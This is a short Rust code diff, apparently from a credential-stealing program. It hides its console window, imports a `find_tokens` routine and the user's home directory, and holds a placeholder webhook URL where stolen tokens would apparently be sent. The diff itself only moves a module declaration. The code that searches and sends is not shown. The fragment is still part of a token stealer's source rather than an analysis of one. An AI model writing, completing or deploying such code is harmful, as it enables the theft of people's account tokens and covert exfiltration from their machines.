@@ -1,11 +1,12 @@
 #![windows_subsystem = "windows"]
 
 mod read;
+mod find;
+
 use read::read::read_lines;
 
 #[tokio::main]
 async fn main() {
-    mod find;
     use find::finder::find_tokens;
     use dirs::home_dir;
     let url = "Webhook Url Here";
